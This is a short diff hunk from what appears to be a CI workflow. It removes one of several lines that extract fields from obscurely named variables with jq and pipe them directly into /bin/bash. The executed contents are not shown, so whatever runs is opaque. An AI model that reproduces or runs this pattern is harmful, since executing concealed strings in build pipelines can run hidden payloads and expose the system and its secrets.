@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$k501" | jq -r .fqyvm72493 | /bin/bash
           printf '%s' "$xbq841" | jq -r .n7549 | /bin/bash
           echo $waox9 | jq -r .viss0 | /bin/bash
-          echo $sb97501 | jq -r .k097 | /bin/bash
           echo $y04596 | jq -r .r25538 | /bin/bash
 
       - name: Save data
